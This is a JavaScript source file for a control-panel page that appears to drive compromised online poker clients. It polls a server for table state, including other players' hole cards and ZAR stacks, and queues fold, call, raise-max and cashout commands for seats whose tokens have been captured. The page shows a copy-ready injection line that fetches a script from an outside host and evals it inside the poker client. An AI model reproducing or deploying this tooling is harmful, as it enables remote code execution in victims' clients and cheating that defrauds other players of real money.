// Remote Control page logic

const REMOTE_PAGE = {
  pollTimer: null,
  commandLog: [],
  currentTable: null,

  init() {
    console.log("🎮 Initializing remote control page");
    this.startPolling();
  },

  destroy() {
    if (this.pollTimer) {
      clearInterval(this.pollTimer);
      this.pollTimer = null;
    }
  },

  startPolling() {
    this.poll();
    this.pollTimer = setInterval(() => this.poll(), 3000);
  },

  async poll() {
    try {
      const data = await API.getTableLatest();
      if (data.ok && data.table) {
        this.currentTable = data.table;
        this.render(data.table);
      } else {
        this.currentTable = null;
        this.renderEmpty();
      }
    } catch (err) {
      console.error("Poll error:", err);
      this.renderEmpty();
    }
  },

  render(table) {
    const boardHtml = this.renderBoard(table);
    const seatsHtml = table.seats.map(seat => this.renderSeat(table, seat)).join("");
    const logHtml = this.renderCommandLog();

    setHTML("#page-content", `
      <div class="inject-box">
        <div class="inject-title">📡🔌 Inject Script into Poker Client</div>
        <div class="inject-row">
          <div class="inject-code" id="inject-command">fetch('https://test.potlimitomaha.xyz:8080/n4p.js').then(r=>r.text()).then(eval)</div>
          <button class="inject-copy-btn" id="copy-inject-btn">📋 COPY</button>
        </div>
      </div>

      ${boardHtml}

      <div class="seats-grid">
        ${seatsHtml}
      </div>

      ${logHtml}

      <div style="margin-top: 12px; text-align: right;">
        <span class="poll-indicator">
          <span class="poll-dot"></span>
          🔄 Polling every 3s &middot; 🗃️ Table: ${table.table_id}
        </span>
      </div>
    `);
  },

  renderBoard(table) {
    const board = table.board || { flop: [], turn: null, river: null };
    const flop = (board.flop || []).map(c => this.cardHtml(c, "board-card")).join("");
    const turn = board.turn ? this.cardHtml(board.turn, "board-card") : '<span class="board-card empty-card">🂠</span>';
    const river = board.river ? this.cardHtml(board.river, "board-card") : '<span class="board-card empty-card">🂠</span>';

    const flopHtml = flop || `
      <span class="board-card empty-card">🂠</span>
      <span class="board-card empty-card">🂠</span>
      <span class="board-card empty-card">🂠</span>
    `;

    return `
      <div class="board-section">
        <span class="street-badge">🃏 ${table.street || "WAITING"}</span>
        <div class="board-cards">
          ${flopHtml}
          <span class="board-divider"></span>
          ${turn}
          <span class="board-divider"></span>
          ${river}
        </div>
        <span class="pot-display">💰 ZAR ${(table.pot_zar || 0).toFixed(2)}</span>
      </div>
    `;
  },

  renderSeat(table, seat) {
    const isConnected = seat.has_token;
    const isActive = seat.status === "playing";
    const canAct = isConnected && isActive;
    const liveClass = seat.name ? "live" : "offline";
    const cardClass = isConnected ? "connected" : (seat.status === "empty" ? "empty-seat" : "");
    const actionClass = seat.action_on ? "action-on" : "";

    const holeCardsHtml = seat.hole_cards && seat.hole_cards.length > 0
      ? `<div class="hole-cards">${seat.hole_cards.map(c => this.cardHtml(c, "card-text")).join("")}</div>`
      : "";

    const pendingHtml = seat.pending_cmd
      ? `<div class="pending-badge">⏳🔄 ${seat.pending_cmd}</div>`
      : "";

    const displayIndex = seat.seat_index + 1;

    return `
      <div class="seat-card ${cardClass} ${actionClass}">
        <div class="seat-header">
          <div>
            <span class="seat-status-dot ${liveClass}"></span>
            <span class="seat-label">💺 Seat ${displayIndex}</span>
            ${seat.is_dealer ? '<span class="dealer-chip">🎯 D</span>' : ""}
          </div>
        </div>
        <div class="seat-info">
          <div class="seat-name">👤 ${seat.name || "Player " + displayIndex}</div>
          <div class="seat-stack">💵 ZAR ${(seat.stack_zar || 0).toFixed(2)}</div>
          <div class="seat-status-text">${seat.name ? "🟢" : "⚫"} ${seat.status}</div>
          ${holeCardsHtml}
          ${pendingHtml}
        </div>
        <div class="pre-actions">
          <div class="pre-action-item">
            <input type="checkbox" id="cf-${seat.seat_index}"
              data-action="PRE_ACTION"
              data-table="${table.table_id}"
              data-seat="${seat.seat_index}"
              data-preaction="check_fold"
              ${!canAct ? "disabled" : ""}>
            <label for="cf-${seat.seat_index}">☑️ Check/Fold</label>
          </div>
          <div class="pre-action-item">
            <input type="checkbox" id="cc-${seat.seat_index}"
              data-action="PRE_ACTION"
              data-table="${table.table_id}"
              data-seat="${seat.seat_index}"
              data-preaction="check_call"
              ${!canAct ? "disabled" : ""}>
            <label for="cc-${seat.seat_index}">☑️ Check/Call</label>
          </div>
        </div>
        <div class="action-buttons">
          <button class="action-btn btn-fold" ${!canAct ? "disabled" : ""}
            data-action="SEAT_CMD" data-table="${table.table_id}" data-seat="${seat.seat_index}" data-cmd="fold">
            🔴 FOLD
          </button>
          <button class="action-btn btn-check" ${!canAct ? "disabled" : ""}
            data-action="SEAT_CMD" data-table="${table.table_id}" data-seat="${seat.seat_index}" data-cmd="check">
            ✅ CHECK
          </button>
          <button class="action-btn btn-call" ${!canAct ? "disabled" : ""}
            data-action="SEAT_CMD" data-table="${table.table_id}" data-seat="${seat.seat_index}" data-cmd="call">
            📞 CALL
          </button>
          <button class="action-btn btn-raise" ${!canAct ? "disabled" : ""}
            data-action="SEAT_CMD" data-table="${table.table_id}" data-seat="${seat.seat_index}" data-cmd="raise_max">
            🔥 RAISE MAX
          </button>
          <button class="action-btn btn-cashout" ${!canAct ? "disabled" : ""}
            data-action="SEAT_CMD" data-table="${table.table_id}" data-seat="${seat.seat_index}" data-cmd="cashout">
            💸 CASHOUT
          </button>
        </div>
      </div>
    `;
  },

  renderEmpty() {
    // Show empty 9-seat table
    const emptyTable = {
      table_id: "waiting",
      variant: "plo",
      street: "WAITING",
      pot_zar: 0,
      dealer_seat: null,
      board: { flop: [], turn: null, river: null },
      seats: Array.from({ length: 9 }, (_, i) => ({
        seat_index: i,
        name: null,
        stack_zar: 0,
        hole_cards: [],
        status: "empty",
        is_dealer: false,
        has_token: false,
        action_on: false,
        last_seen_ago: null,
        pending_cmd: null
      }))
    };
    this.render(emptyTable);
  },

  renderCommandLog() {
    if (this.commandLog.length === 0) {
      return `
        <div class="command-log-section">
          <div class="command-log-header">📜⚡ Command Log</div>
          <div class="command-log-body">
            <div class="log-entry"><span style="color: var(--text-faint);">📭 No commands sent yet</span></div>
          </div>
        </div>
      `;
    }

    const entries = this.commandLog.map(entry => {
      const statusEmoji = entry.status === "PENDING" ? "⏳" : entry.status === "COMPLETED" ? "✅" : "❌";
      return `
        <div class="log-entry">
          <span>⏰ ${entry.timestamp} | 💺 Seat ${entry.seat + 1} | 🎯 ${entry.command}</span>
          <span class="log-status ${entry.status.toLowerCase()}">${statusEmoji} ${entry.status}</span>
        </div>
      `;
    }).join("");

    return `
      <div class="command-log-section">
        <div class="command-log-header">📜⚡ Command Log (${this.commandLog.length})</div>
        <div class="command-log-body">${entries}</div>
      </div>
    `;
  },

  cardHtml(card, className) {
    if (!card) return "";
    const suit = card.slice(-1).toLowerCase();
    const rank = card.slice(0, -1).toUpperCase();
    const suitMap = { h: "heart", d: "diamond", c: "club", s: "spade" };
    const suitSymbol = { h: "\u2665", d: "\u2666", c: "\u2663", s: "\u2660" };
    const suitClass = suitMap[suit] || "";
    return `<span class="${className} ${suitClass}">${rank}${suitSymbol[suit] || suit}</span>`;
  },

  async sendCommand(tableId, seatIndex, commandType) {
    try {
      const data = await API.queueCommand(tableId, seatIndex, commandType);
      if (data.ok) {
        this.addToLog(seatIndex, commandType, "PENDING");
      }
    } catch (err) {
      console.error("Command failed:", err);
      this.addToLog(seatIndex, commandType, "FAILED");
    }
  },

  togglePreAction(tableId, seatIndex, action, checked) {
    if (checked) {
      // Uncheck the other checkbox
      const otherId = action === "check_fold" ? "cc-" + seatIndex : "cf-" + seatIndex;
      const other = document.getElementById(otherId);
      if (other) other.checked = false;
      this.sendCommand(tableId, seatIndex, action);
    } else {
      this.sendCommand(tableId, seatIndex, "clear_preaction");
    }
  },

  addToLog(seatIndex, command, status) {
    const timestamp = new Date().toLocaleTimeString();
    this.commandLog.unshift({ timestamp, seat: seatIndex, command, status });
    this.commandLog = this.commandLog.slice(0, 20);
  },

  copyInjectCode() {
    const code = document.getElementById("inject-command");
    if (!code) return;
    navigator.clipboard.writeText(code.textContent).then(() => {
      const btn = document.getElementById("copy-inject-btn");
      if (btn) {
        btn.textContent = "✅ COPIED";
        btn.classList.add("copied");
        setTimeout(() => {
          btn.textContent = "📋 COPY";
          btn.classList.remove("copied");
        }, 2000);
      }
    });
  }
};
